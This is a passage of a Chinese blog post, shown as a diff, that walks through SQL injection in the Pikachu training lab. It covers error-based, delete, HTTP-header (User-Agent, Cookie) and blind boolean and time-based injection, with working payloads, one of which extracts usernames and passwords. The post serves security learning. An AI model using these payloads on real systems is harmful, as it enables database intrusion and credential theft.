class="hljs-number">0.15522042769493574</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure>
+
+<p>floor(rand()) 的结果为0.</p>
+<p>floor(rand(0)*2)的结果是0或1，因为rand()返回的值在0和1之间，乘以2就是0和2之间，向下取反后结果是0或1。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x7c</span>,(<span class="hljs-keyword">select</span> version())) <span class="hljs-keyword">from</span> users;<br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------------+</span><br><span class="hljs-operator">|</span> concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x7c</span>,(<span class="hljs-keyword">select</span> version())) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">0</span><span class="hljs-operator">|</span><span class="hljs-number">5.7</span><span class="hljs-number">.28</span>                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span><span class="hljs-operator">|</span><span class="hljs-number">5.7</span><span class="hljs-number">.28</span>                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-number">1</span><span class="hljs-operator">|</span><span class="hljs-number">5.7</span><span class="hljs-number">.28</span>                                         <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">--------------------------------------------------+</span><br><span class="hljs-number">3</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure>
+
+<p>可见生成了固定的随机序列（01101）。</p>
+<p>count()用于计数、group by可进行筛选分组。</p>
+<p>使用count(*)和group by查询表，是先创建一个虚拟表，一条条读取原表，再填进虚拟表。读取到没有的就写入、有的就count+1.</p>
+<p>可以让它们组合起来获取信息。</p>
+<p>例如构造payload如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>), concat(<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>),<span class="hljs-number">0x7c</span>,(<span class="hljs-keyword">select</span> version()))<span class="hljs-keyword">as</span> test <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> test;<br>ERROR <span class="hljs-number">1062</span> (<span class="hljs-number">23000</span>): Duplicate entry <span class="hljs-string">&#x27;1|5.7.28&#x27;</span> <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;&lt;group_key&gt;&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>版本信息被暴露在报错里。</p>
+<p><strong>报错原理如下：</strong></p>
+<p><code>select count(*), concat(floor(rand(0)*2),0x7c,(select version()))as test from users group by test;</code></p>
+<p>等同于</p>
+<p><code>select count(*), concat(floor(rand(0)*2),0x7c,(select version())) from users group by (floor(rand(0)*2),0x7c,(select version()))</code></p>
+<p>首先会建立一个虚拟表。</p>
+<p>然后执行第一个<code>floor(rand(0)*2)</code>，结果为0|5.7.28。group by会再执行一次（第二次调用），结果为1|5.7.28。</p>
+<p>此时并没有1|5.7.28，所以插入该Key，count为1.</p>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1|5.7.28</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<p>因为<code>floor(rand(0)*2)</code>的结果数列为0、1、1、0、1</p>
+<p>接着向下执行，第二次的结果（第三、第四次调用）分别为1|5.7.28和0|5.7.28。</p>
+<p>此时key为1|5.7.28的count值加一。</p>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1|5.7.28</td>
+<td>2</td>
+</tr>
+</tbody></table>
+<p>但key中没有0|5.7.28，所以加入新的key。</p>
+<p>加入新的key，需要再一次调用floor(rand(0)*2)，也就是第五次调用，这时候的结果为1。</p>
+<p>可是1|5.7.28已经存在了，再一次添加就会报错。</p>
+<p>所以报错为<code>ERROR 1062 (23000): Duplicate entry &#39;1|5.7.28&#39; for key &#39;&lt;group_key&gt;&#39;</code>，意为添加了重复条目。</p>
+<p>可以通过这个报错来获取我们需要的信息。</p>
+<p><strong>注意：表中最少要3条数据，否则不会报错。</strong></p>
+<h3 id="3-extractvalue"><a href="#3-extractvalue" class="headerlink" title="3.extractvalue()"></a>3.extractvalue()</h3><blockquote>
+<p>1.函数含义： 使用 XPath 表示法从 XML 字符串中提取值，即返回的是一个字符串。</p>
+<p>2.用法</p>
+<p>ExtractValue(xml_frag, xpath_expr)</p>
+<p>两个字符串参数：</p>
+<p>(1) xml_frag: XML 标记片段，xml语言的标签闭合内的值，</p>
+<p>(2) xpath_expr: XPath 表达式，匹配xml标签内的值并返回。</p>
+</blockquote>
+<p>例如：<code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e))# </code></p>
+<p>和updatexml用法类似。</p>
+<h3 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp()"></a>4.exp()</h3><blockquote>
+<p>EXP(number)</p>
+<p>参数为次方值。</p>
+<p><code>EXP()</code> 函数返回自然常数 <code>e</code> 的指定数值的次方。</p>
+<p>如果参数 <code>number</code> 为 <code>NULL</code>，<code>EXP()</code> 函数将会返回 <code>NULL</code>。</p>
+</blockquote>
+<p>由于mysql记录的double数值有限，当exp的值大于709时，就会引起溢出错误。</p>
+<p>pow()也是类似。</p>
+<p><code>~</code> 运算符按位取反的方式得到一个最大值，该运算符也可以处理一个字符串，经过其处理的字符串会变成大一个很大整数足以超过 MySQL 的 Double 数组范围，从而报错输出。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> version());<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> version())  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-number">18446744073709551610</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+</span><br><br><span class="hljs-comment">-- 例如</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> version())x));<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9849">详情见此</a></p>
+<p>ps:MySQL&gt;5.5.53不可用。</p>
+<h2 id="6-delete注入"><a href="#6-delete注入" class="headerlink" title="6.delete注入"></a>6.delete注入</h2><p>和insert&#x2F;update注入一样，使用报错注入。</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013652464.png" srcset="/img/loading.gif" lazyload alt="image-20230328013652464" style="zoom: 50%;" />
+
+<p>留言后删除，使用bp进行抓包，对id值进行修改。</p>
+<p>此处payload为<code>1 or updatexml(1,concat(0x7e,database()),0)</code></p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013814090.png" srcset="/img/loading.gif" lazyload alt="image-20230328013814090"></p>
+<p>将payload进行处理。</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013904797.png" srcset="/img/loading.gif" lazyload alt="image-20230328013904797" style="zoom:50%;" />
+
+<p>回显获得了数据库名：</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328013943409.png" srcset="/img/loading.gif" lazyload alt="image-20230328013943409" style="zoom:33%;" />
+
+<h2 id="7-http-header-注入"><a href="#7-http-header-注入" class="headerlink" title="7.http header 注入"></a>7.http header 注入</h2><p>和insert&#x2F;update 注入页面类似的登录页面，输入用户名密码即可登录。</p>
+<p>登录后回显出一些信息：</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328104838427.png" srcset="/img/loading.gif" lazyload alt="image-20230328104838427" style="zoom:50%;" />
+
+<p>注入就从回显的信息入手，回显的信息都是http报文的内容。</p>
+<h3 id="HTTP报文分析"><a href="#HTTP报文分析" class="headerlink" title="HTTP报文分析"></a>HTTP报文分析</h3><p>http报文由<strong>三部分</strong>组成：<strong>状态行（请求行&#x2F;相应行）、首部、主体</strong></p>
+<p>http报文可以分为<strong>请求报文</strong>和<strong>响应报文</strong>（客户端发送请求，服务器响应请求）。</p>
+<p>请求报文是由请求方法、请求 URI、协议版本、可选的请求首部字段和内容实体构成的。</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328105626168.png" srcset="/img/loading.gif" lazyload alt="《图解http》-请求报文" style="zoom:33%;" />
+
+<p>响应报文基本上由协议版本、状态码（表示请求成功或失败的数字代 码）、用以解释状态码的原因短语、可选的响应首部字段以及实体主体构成。</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328105909551.png" srcset="/img/loading.gif" lazyload alt="《图解http》-响应报文" style="zoom: 33%;" />
+
+
+
+<p>http头注入的<strong>产生原因</strong>：没有对http头中的User-agent、Referer、Cookie等进行过滤。</p>
+<p>以下为案例请求包（不要抓错）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/pikachu/vul/sqli/sqli_header/sqli_header.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br>User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/pikachu/vul/sqli/sqli_header/sqli_header_login.php<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; Idea-c3372850=66e26605-e73d-4e3c-aa9a-17c04f537994; PHPSESSID=4ar35f3bvvcbi8io62reop6865<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>常见的http头部注入：UA头注入、Referer注入、Cookie注入</strong></p>
+<table>
+<thead>
+<tr>
+<th>首部字段名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>User-Agent</td>
+<td>HTTP 客户端程序的信息</td>
+</tr>
+<tr>
+<td>Referer</td>
+<td>对请求中 URI 的原始获取方</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>存储数据<br />（例如：使无状态的HTTP协议变成有状态的session连接、登录权限）</td>
+</tr>
+</tbody></table>
+<h3 id="1-UA头注入"><a href="#1-UA头注入" class="headerlink" title="1.UA头注入"></a>1.UA头注入</h3><p>也就是User-Agent处注入。</p>
+<p>先进行<code>&#39;</code>测试。</p>
+<p>回显：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the <span class="hljs-keyword">right</span> syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;&#x27;</span> <span class="hljs-keyword">at</span> line <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>直接输入1回显正常。</p>
+<p>多次测试后，猜测有insert行为，可以使用报错注入。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- payload</span><br><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,database()),1) and &#x27;</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328171330234.png" srcset="/img/loading.gif" lazyload alt="image-20230328171330234" style="zoom:33%;" />
+
+<p>成功回显数据库.</p>
+<p>其他几种报错注入的测试：</p>
+<ul>
+<li>floor()</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 版本</span><br><span class="hljs-string">&#x27;or (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))x from information_schema.tables group by x)a) or&#x27;</span><br><br><span class="hljs-comment">-- 回显用户名密码</span><br><span class="hljs-string">&#x27;or (select 1 from (select count(*),concat((select group_concat(username,0x3a,password) from users),floor(rand(0)*2))x from information_schema.tables group by x)a) or&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>extravalue()</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-Cookie注入"><a href="#2-Cookie注入" class="headerlink" title="2.Cookie注入"></a>2.Cookie注入</h3><p>一样的报错注入。</p>
+<p>payload：<code>&#39; and updatexml(1,concat(0x7e,database()),0)#</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ant[uname]=admin&#x27; and updatexml(1,concat(0x7e,database()),0)#; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; Idea-c3372850=66e26605-e73d-4e3c-aa9a-17c04f537994; PHPSESSID=4ar35f3bvvcbi8io62reop6865<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="8-盲注（基于boolean）"><a href="#8-盲注（基于boolean）" class="headerlink" title="8.盲注（基于boolean）"></a>8.盲注（基于boolean）</h2><p>当后台使用了一些方法，使回显不出现我们想要的信息，此时进行注入叫做盲注。</p>
+<p><strong>有三种常见的盲注方法：布尔盲注、时间盲注、运行错误盲注</strong></p>
+<p>由于手工注入十分麻烦，建议使用工具。</p>
+<p>常用函数：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>length()</td>
+<td>返回字符串的长度</td>
+</tr>
+<tr>
+<td>substr()</td>
+<td>用来截取字符串</td>
+</tr>
+<tr>
+<td>sleep()</td>
+<td>用来制造延时用来截取字符串</td>
+</tr>
+<tr>
+<td>if(ex1,ex2,ex3)</td>
+<td>判断语句，ex1正确执行ex2，错误执行ex3</td>
+</tr>
+</tbody></table>
+<p>对该题目进行测试：</p>
+<p>输入正确的用户名，回显正确uid和email。</p>
+<p>输入错误的用户名，回显“您输入的username不存在，请重新输入！”</p>
+<p>输入正确用户名+<code>&#39; and 1=1#</code>，回显正确uid和email。</p>
+<p>输入正确用户名+<code>&#39; and 1=2#</code>，回显“您输入的username不存在，请重新输入！”。</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328182334135.png" srcset="/img/loading.gif" lazyload alt="image-20230328182334135" style="zoom:33%;" />
+
+<p>说明内部会进行判断，且有注入漏洞存在。</p>
+<p>输入payload进行测试，先测试<strong>数据库的长度</strong>。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- test1为已经存在的用户</span><br>test1<span class="hljs-string">&#x27; and length(database())&gt;=1#   回显正常</span><br><span class="hljs-string">test1&#x27;</span> <span class="hljs-keyword">and</span> length(database())<span class="hljs-operator">&gt;=</span><span class="hljs-number">7</span>#   回显正常<br>test1<span class="hljs-string">&#x27; and length(database())&gt;=8#   回显错误</span><br></code></pre></td></tr></table></figure>
+
+<p>这也就意味着数据库的长度为7.</p>
+<p>下一步来判断数据库的具体名字，使用substr和ascii判断。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">test1<span class="hljs-string">&#x27; and ascii(substr(database(), 1, 1)) &gt; 105#   回显正常</span><br><span class="hljs-string">test1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">120</span>#   回显错误<br>test1<span class="hljs-string">&#x27; and ascii(substr(database(), 1, 1)) = 112#   回显正常</span><br></code></pre></td></tr></table></figure>
+
+<p>112也就是p。</p>
+<p>也可以直接跑，结果也是p。</p>
+<p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328184536047.png" srcset="/img/loading.gif" lazyload alt="image-20230328184536047"></p>
+<p>设置两个注入点，就可以一次跑出来数据库的名字。</p>
+<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230328185224224.png" srcset="/img/loading.gif" lazyload alt="image-20230328185224224" style="zoom:50%;" />
+
+<p>1:112、2:105、3:107、4:97、5:99、6:104、7:117</p>
+<p>p、i、k、a、c、h、u。</p>
+<h2 id="9-盲注（基于time）"><a href="#9-盲注（基于time）" class="headerlink" title="9.盲注（基于time）"></a>9.盲注（基于time）</h2><p>通过if判断，正确休眠，错误查询。</p>
+<p>例如payload如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">test1<span class="hljs-string">&#x27; and  if((substr(database(), 1, 1))=&#x27;</span>p<span class="hljs-string">&#x27;, sleep(5), null)#</span><br></code></pre></td></tr></table></figure>
+
+<p>如果database的第一个字符为p就睡眠五秒，也可以设置少一点。</p>
+<p>其他的和布尔盲注差别不大。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52385170/article/details/128093840">https://blog.csdn.net/weixin_52385170/article/details/128093840</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/256097.html">https://www.freebuf.com/articles/web/256097.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/398726175">https://zhuanlan.zhihu.com/p/398726175</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51789211/article/details/128677727">https://blog.csdn.net/qq_51789211/article/details/128677727</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/345056.html">https://www.freebuf.com/vuls/345056.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9849">https://xz.aliyun.com/t/9849</a></p>
+<p><a target="_blank" rel="noopener" href="http://imyhq.com/sec/1907.html">http://imyhq.com/sec/1907.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/263555.html">https://www.freebuf.com/articles/web/263555.html</a></p>
+<p>《图解http》</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">靶场</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pikachu靶场+分析</div>
+      <div>http://example.com/2023/04/25/2023/pikachu靶场（+分析）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>咩包</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/03/24/2023/%E8%BF%87%E5%8E%BB%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AE%80%E5%8D%95%E6%95%B4%E5%90%88/" title="知识点简单整合">
+                        <span class="hidden-mobile">知识点简单整合</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       主题： <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
